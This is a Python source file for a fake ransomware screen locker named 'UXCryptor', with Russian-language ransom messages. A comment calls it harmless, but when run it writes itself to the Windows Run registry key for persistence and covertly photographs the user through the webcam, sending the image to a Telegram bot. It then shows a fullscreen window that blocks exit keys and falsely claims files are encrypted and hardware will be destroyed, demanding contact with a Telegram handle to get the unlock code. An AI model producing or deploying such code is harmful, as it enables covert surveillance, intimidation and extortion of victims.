import tkinter as tk
from pathlib import Path
import ctypes
import os
import sys
import socket
from PIL import Image, ImageTk, ImageDraw, ImageFont
import time
import cv2
import requests

if sys.platform == "win32":
    import winreg


BOT_TOKEN = os.getenv("TG_BOT_TOKEN", "твой токен")
CHAT_ID = os.getenv("TG_CHAT_ID", "твой айди")


def open_camera():
    backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY]
    for index in (0, 1):
        for backend in backends:
            cap = cv2.VideoCapture(index, backend)
            if cap.isOpened():
                return cap
            cap.release()
    return None


def capture_photo(filename="snapshot.jpg", attempts=6, delay=0.25):
    cap = open_camera()
    if cap is None:
        print("Камера не открылась")
        return None

    try:
        time.sleep(0.5)
        frame = None
        for _ in range(attempts):
            ret, candidate = cap.read()
            if ret and candidate is not None and candidate.size > 0:
                frame = candidate
                break
            time.sleep(delay)

        if frame is None:
            print("Не удалось получить кадр с камеры")
            return None

        cv2.imwrite(filename, frame)
        return filename
    finally:
        cap.release()


def send_photo_to_telegram(image_path):
    if not image_path or not os.path.exists(image_path):
        return False

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(image_path, "rb") as photo_file:
            response = requests.post(
                url,
                data={"chat_id": CHAT_ID},
                files={"photo": photo_file},
                timeout=15,
            )
        response.raise_for_status()
        data = response.json()
        print("Telegram ответ ok:", data.get("ok"))
        return bool(data.get("ok"))
    except Exception as e:
        print("Ошибка отправки в Telegram:", e)
        return False
    finally:
        if os.path.exists(image_path):
            os.remove(image_path)


# UXCryptor: harmless visual demo.
# It does NOT encrypt, delete, modify, or lock files or Windows.
# F11 toggles fullscreen; Alt+F4 and Esc trigger the warning popup.

if getattr(sys, "frozen", False):
    ROOT = Path(sys.executable).resolve().parent
else:
    ROOT = Path(__file__).resolve().parent

BOOT_IMAGE = ROOT / "photo_2026-11-17_15-32-31.jpg"
FINAL_IMAGE = ROOT / "photo_2026-11-17_16-03-40.jpg"
MP3_FILE = ROOT / "soundtrack.mp3"

CORRECT_PASSWORD = "123321"
RED_COLOR = "#FF1493"
BLACK_COLOR = "#000000"
WHITE_COLOR = "#FFFFFF"
YELLOW_COLOR = "#FFD700"

FONT_MAIN_STR = ("Consolas", 10, "bold")
FONT_TITLE_STR = ("Consolas", 11, "bold")

MCI_ALIAS = "uxcryptor_audio"
_audio_open = False


def register_startup_exe(app_name: str = "UXCryptor"):
    # Срабатывает только для скомпилированного .exe, а не для обычного .py
    if not getattr(sys, "frozen", False) or sys.platform != "win32":
        return

    exe_path = os.path.abspath(sys.executable)
    run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            run_key,
            0,
            winreg.KEY_SET_VALUE,
        ) as key:
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, f'"{exe_path}"')
    except OSError:
        pass


def play_audio():
    """Play the MP3 using Windows' built-in MCI API (no pip package)."""
    global _audio_open
    if os.name != "nt" or not MP3_FILE.is_file():
        return
    try:
        mci = ctypes.windll.winmm.mciSendStringW
        mci.argtypes = [
            ctypes.c_wchar_p, ctypes.c_wchar_p,
            ctypes.c_uint, ctypes.c_void_p
        ]
        mci.restype = ctypes.c_uint
        path = str(MP3_FILE).replace('"', "")
        if mci(f'open "{path}" type mpegvideo alias {MCI_ALIAS}',
               None, 0, None) == 0:
            _audio_open = True
            mci(f"play {MCI_ALIAS}", None, 0, None)
    except Exception:
        pass


def stop_audio():
    global _audio_open
    if os.name == "nt" and _audio_open:
        try:
            ctypes.windll.winmm.mciSendStringW(
                f"close {MCI_ALIAS}", None, 0, None
            )
        except Exception:
            pass
    _audio_open = False


class UXCryptor:
    def __init__(self, root):
        self.root = root
        root.title("UXCryptor — visual demo")
        root.configure(bg="black")
        root.geometry("1920x1080")
        root.minsize(800, 600)

        self.fullscreen = True
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)

        self.boot_image = self.load_image(BOOT_IMAGE)
        self.final_image_path = FINAL_IMAGE

        self.widgets = []
        self.password_input = ""
        self.cursor_visible = True
        self.is_flashing = False
        self.warning_window = None

        play_audio()
        self.show_boot()

        root.bind("<Key>", self.on_key_press)
        root.protocol("WM_DELETE_WINDOW", self.trigger_warning_popup)
        root.bind("<F11>", self.toggle_fullscreen)
        root.bind("<Escape>", lambda _event: self.trigger_warning_popup())

    @staticmethod
    def load_image(path):
        if not path.is_file():
            print("Файл не найден:", path)
            return None

        try:
            from PIL import Image, ImageTk
            return ImageTk.PhotoImage(Image.open(path))
        except Exception as e:
            print("Ошибка загрузки:", e)
            return None

    def toggle_fullscreen(self, _event=None):
        self.fullscreen = not self.fullscreen
        self.root.attributes("-fullscreen", self.fullscreen)

    def clear(self):
        for widget in self.widgets:
            try:
                widget.destroy()
            except tk.TclError:
                pass
        self.widgets.clear()

    def place(self, widget, **kwargs):
        self.widgets.append(widget)
        widget.place(**kwargs)
        return widget

    def show_boot(self):
        self.clear()
        self.root.configure(bg="black")

        if self.boot_image:
            image_label = tk.Label(
                self.root, image=self.boot_image, bg="black", bd=0
            )
            self.place(image_label, relx=0.5, rely=0.5, anchor="center")
        else:
            self.place(tk.Label(
                self.root,
                text="BOOT IMAGE NOT FOUND\n"
                     "photo_2026-11-17_15-32-31.jpg",
                bg="black", fg="white", font=("Consolas", 18)
            ), relx=0.5, rely=0.5, anchor="center")

        self.boot_text = tk.Label(
            self.root, text="Booting Windows ...",
            bg="black", fg="#eeeeee",
            font=("Consolas", 19), justify="left", anchor="nw"
        )
        self.place(self.boot_text, x=24, y=18)

        self.root.after(1000, lambda: self.set_boot_text(
            "Booting Windows ...\n"
            "Boot error: 0x03527737\n"
            "Boot error: 0x0266712\n"
            "Boot error: 0x02897593\n"
            "Boot error: 0x01447812"
        ))
        self.root.after(3000, lambda: self.set_boot_text(
            self.boot_text.cget("text") + "\nBoot error: 0x0700892"
        ))
        self.root.after(5000, lambda: self.set_boot_text(
            self.boot_text.cget("text") + "\n"
                                          "Boot error: 0x03803618\n"
                                          "Memory section at address 0x0424* is locked...\n"
                                          "Service UX-Cryptor 45 started."
        ))
        self.root.after(5000, lambda: self.set_boot_text(
            self.boot_text.cget("text") + "\n*Windows blocked!"
        ))
        self.root.after(6900, self.show_furri)

    def set_boot_text(self, text):
        try:
            if self.boot_text.winfo_exists():
                self.boot_text.config(text=text)
        except tk.TclError:
            pass

    def show_furri(self):
        self.clear()
        self.root.configure(bg="#FFFFFF")

        art = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⣿⢷⡄⠀⠀⠀⠀⠀⣀⣠⣤⣤⡤⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⣌⠉⠉⣛⣷⡴⠶⠶⠶⣟⡆⠙⣧⣤⡴⠞⠛⠉⠉⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢻⡄⠻⣯⡀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠆⠀⠀⠀⠀⠀⠀⢼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠸⣇⠀⠈⠙⠷⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⢻⡆⠀⠀⢀⣤⣤⣀⠀⠀⠀⣴⡞⠾⣦⡀⠀⠀⣠⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠈⢻⣆⠀⣾⠁⡏⢹⠀⠀⢐⡇⠸⠀⠸⠇⠀⠶⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢈⡽⣂⢃⠀⣇⢸⠀⡀⢀⡧⠼⠀⣰⣶⠆⢰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠈⢻⡿⣟⡃⠈⠘⠻⣯⡉⣿⠀⠀⠀⣠⡟⣘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⢸⣇⣨⣛⣶⠶⠲⠈⠛⠋⠀⠀⠚⣿⣀⣉⣡⣤⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⣴⡾⡛⠫⣿⠳⣥⡀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡟⢭⢈⠈⠙⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⢀⣾⠡⢕⠈⠈⡼⣟⣿⠀⠀⠀⠀⠀⠀⠀⢠⡀⢹⡡⡁⣀⢣⠁⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⣯⠀⠘⠢⠂⠀⣿⠻⢾⠀⠀⠀⠀⠀⠀⠈⢻⣌⠗⠈⠈⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣠⣿⠀⠀
    ⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⢸⡻⣦⡀⠀⠀⠀⣸⠇⠀⠀⠀⠀⠀⣠⡾⠋⣿⠀⠀
    ⠀⠀⠀⠀⠀⢻⣆⠀⠀⠀⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠈⣦⣈⠻⠶⠆⣠⣿⣆⣤⢾⡄⣠⡾⠋⠀⠀⢸⡆⠀
    ⠀⠀⠀⠀⠀⠀⠙⢷⣀⣀⡾⣻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⡟⠛⠛⠓⠉⠀⠸⠟⠁⠀⠀⠀⠀⠈⣇⠀
    ⠀⠀⠀⠀⠀⠀⠀⠘⠋⠉⢱⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠰⢶⣿⡁⠀⠀⠘⢳⡖⠀⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⡄⠀⠀⠀⠨⣏⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀⠀⠀⣭⠀⠀⠀⠀⢀⣀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠟⠁⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡶⠶⢦⠌⣿⠛⠛⠛⠛⠋⡉⣿⠀⠀⢀⠀⠀⢠⡴⠶⠶⠛⠉⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣀⢀⡀⣽⡇⠤⠤⠒⠊⠀⣻⠄⠀⠘⠻⠶⠾⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠀⠀⢐⡧⠀⠀⠀⠀⡠⣾⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠒⠒⠁⣿⠂⠒⠈⠉⠀⣾⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠄⠒⠹⡗⠂⠒⠒⠉⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""

        label = tk.Label(
            self.root,
            text=art,
            bg="#FF0000",
            fg="#171017",
            font=("Segoe UI Symbol", 15),
            justify="left",
            anchor="nw"
        )
        self.place(label, x=0, y=0, relwidth=1, relheight=1)

        self.root.after(1000, self.show_main)

    def show_main(self):
        self.clear()
        self.root.configure(bg="black")

        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()

        try:
            if self.final_image_path.is_file():
                original_image = Image.open(self.final_image_path).convert("RGB")
            else:
                original_image = Image.new("RGB", (1920, 1080), color=(10, 10, 10))

            img_w, img_h = original_image.size
            cx = img_w // 2
            cy = img_h // 2

            draw = ImageDraw.Draw(original_image)

            try:
                font_title = ImageFont.truetype("consola.ttf", 11)
                font_main = ImageFont.truetype("consola.ttf", 10)
            except:
                font_title = ImageFont.load_default()
                font_main = ImageFont.load_default()

            box_w = 434
            box_h = 105
            box_left = cx - box_w // 2
            box_top = cy - 59

            title_text = "   Ваши файлы зашифрованы!   "
            title_w = draw.textlength(title_text, font=font_title)
            title_x = cx - title_w // 2
            title_y = box_top - 17

            draw.rectangle([title_x - 4, title_y - 2, title_x + title_w + 4, title_y + 13], fill=RED_COLOR)
            draw.text((title_x, title_y), title_text, fill=BLACK_COLOR, font=font_title)

            draw.rectangle([box_left, box_top, box_left + box_w, box_top + box_h], outline=RED_COLOR, width=2)

            warning_text = (
                "Упс! Вы подверглись масштабной хакерской атаке и теперь Ваш компьютер\n"
                "заблокирован. А все имеющиеся диски и файлы на них зашифрованы хакерской\n"
                "группировкой. Любые действия, связанные с попыткой обмануть систему\n"
                "нанесут непоправимый вред Вашему компьютеру и приведут к потере всех\n"
                "важных файлов без возможности восстановления. При попытке снять\n"
                "блокировку у главный загрузчик материно будет снесен и будет подана\n"
                "рекурсивная нагрузка на ваш процессор, что приведет к его неисправности.\n"
                "У вас есть 48 часов с момента запуска чтобы ввести код\n"
                "Что бы получить код, напиши              @exehok (Telegram)"
            )

            lines = warning_text.split('\n')
            text_x = box_left + 5
            text_y = box_top + 4
            for line in lines:
                draw.text((text_x, text_y), line, fill=RED_COLOR, font=font_main)
                text_y += 9.5

            resized_image = original_image.resize((screen_width, screen_height), Image.Resampling.LANCZOS)
            self.bg_photo = ImageTk.PhotoImage(resized_image)
        except Exception as e:
            print(f"Ошибка рисовки: {e}")
            self.bg_photo = None

        self.canvas = tk.Canvas(self.root, highlightthickness=0, bg=BLACK_COLOR)
        self.place(self.canvas, x=0, y=0, relwidth=1, relheight=1)

        if self.bg_photo:
            self.canvas.create_image(0, 0, image=self.bg_photo, anchor="nw")

        self.bottom_box = tk.Frame(
            self.canvas,
            bg=BLACK_COLOR,
            highlightbackground=RED_COLOR,
            highlightthickness=2,
            padx=10,
            pady=6
        )

        self.prompt_label = tk.Label(
            self.bottom_box,
            text="Введите код разблокировки:",
            bg=BLACK_COLOR,
            fg=RED_COLOR,
            font=FONT_TITLE_STR
        )
        self.prompt_label.pack(pady=(0, 4))

        self.input_bar = tk.Label(
            self.bottom_box,
            text="",
            bg=RED_COLOR,
            fg=BLACK_COLOR,
            font=("Consolas", 12, "bold"),
            width=65,
            height=1
        )
        self.input_bar.pack(pady=(0, 3))

        footer_frame = tk.Frame(self.bottom_box, bg=BLACK_COLOR)
        footer_frame.pack(fill="x", pady=(2, 0))

        pc_name = socket.gethostname()
        self.pc_label = tk.Label(
            footer_frame,
            text=f"Current PC: {pc_name}",
            bg=BLACK_COLOR,
            fg=RED_COLOR,
            font=FONT_MAIN_STR
        )
        self.pc_label.pack(side="left")

        self.enter_label = tk.Label(
            footer_frame,
            text="Enter [Ввод]",
            bg=BLACK_COLOR,
            fg=RED_COLOR,
            font=FONT_MAIN_STR
        )
        self.enter_label.pack(side="right")

        self.canvas.create_window(
            screen_width // 2, screen_height // 2 + 130,
            window=self.bottom_box, anchor="center"
        )

        self.blink_cursor()

    def update_display(self):
        if self.is_flashing:
            return
        dots = "●" * len(self.password_input)
        cursor = "█" if self.cursor_visible else " "
        try:
            self.input_bar.config(text=f"{dots}{cursor}", bg=RED_COLOR, fg=BLACK_COLOR)
        except tk.TclError:
            pass

    def blink_cursor(self):
        if not self.is_flashing:
            self.cursor_visible = not self.cursor_visible
            self.update_display()
        try:
            self.root.after(500, self.blink_cursor)
        except tk.TclError:
            pass

    def flash_enter_button(self, step=0):
        colors = [WHITE_COLOR, RED_COLOR, WHITE_COLOR, RED_COLOR, WHITE_COLOR, RED_COLOR]
        try:
            if step < len(colors):
                self.enter_label.config(fg=colors[step])
                self.root.after(150, lambda: self.flash_enter_button(step + 1))
            else:
                self.enter_label.config(fg=RED_COLOR)
                self.input_bar.config(
                    text="Введеный код не совпадает с ключом разблокировки!",
                    bg=RED_COLOR,
                    fg=YELLOW_COLOR
                )
                self.root.after(2500, self.reset_after_error)
        except tk.TclError:
            pass

    def reset_after_error(self):
        self.is_flashing = False
        self.password_input = ""
        self.update_display()

    def trigger_warning_popup(self, event=None):
        if self.warning_window is not None and self.warning_window.winfo_exists():
            return

        self.warning_window = tk.Toplevel(self.root)
        self.warning_window.overrideredirect(True)
        self.warning_window.configure(bg=BLACK_COLOR)

        w, h = 420, 150
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        x = (sw // 2) - (w // 2)
        y = (sh // 2) - (h // 2)
        self.warning_window.geometry(f"{w}x{h}+{x}+{y}")
        self.warning_window.attributes("-topmost", True)

        frame = tk.Frame(
            self.warning_window,
            bg=BLACK_COLOR,
            highlightbackground=RED_COLOR,
            highlightthickness=2,
            padx=15,
            pady=15
        )
        frame.pack(fill="both", expand=True)

        msg_label = tk.Label(
            frame,
            text="",
            bg=BLACK_COLOR,
            fg=RED_COLOR,
            font=("Consolas", 11, "bold"),
            justify="center",
            wraplength=380
        )
        msg_label.pack(expand=True)

        def flash_popup(step=0):
            flash_colors = [RED_COLOR, BLACK_COLOR, RED_COLOR, BLACK_COLOR]
            try:
                if step < len(flash_colors):
                    frame.config(highlightbackground=flash_colors[step])
                    self.warning_window.after(120, lambda: flash_popup(step + 1))
                else:
                    frame.config(highlightbackground=RED_COLOR)
                    msg_label.config(text="Замечена и остановлена попытка снять блокировку!")
                    self.warning_window.after(2500, close_popup)
            except tk.TclError:
                pass

        def close_popup():
            if self.warning_window and self.warning_window.winfo_exists():
                self.warning_window.destroy()
                self.warning_window = None

        flash_popup()

    def on_key_press(self, event):
        if event.keysym in ("Escape", "Alt_L", "Alt_R", "F4", "Super_L", "Super_R", "Win_R", "Win"):
            self.trigger_warning_popup()
            return

        if self.is_flashing:
            return

        if event.keysym == "Return":
            self.check_code()
        elif event.keysym == "BackSpace":
            self.password_input = self.password_input[:-1]
            self.update_display()
        elif event.char and event.char.isprintable() and len(self.password_input) < 35:
            self.password_input += event.char
            self.update_display()

    def check_code(self):
        if self.password_input == CORRECT_PASSWORD:
            self.close()
        else:
            self.is_flashing = True
            self.flash_enter_button()

    def close(self):
        stop_audio()
        self.root.destroy()


if __name__ == "__main__":
    register_startup_exe("UXCryptor")
    photo = capture_photo("snapshot.jpg")
    send_photo_to_telegram(photo)

    window = tk.Tk()
    app = UXCryptor(window)
    window.mainloop()
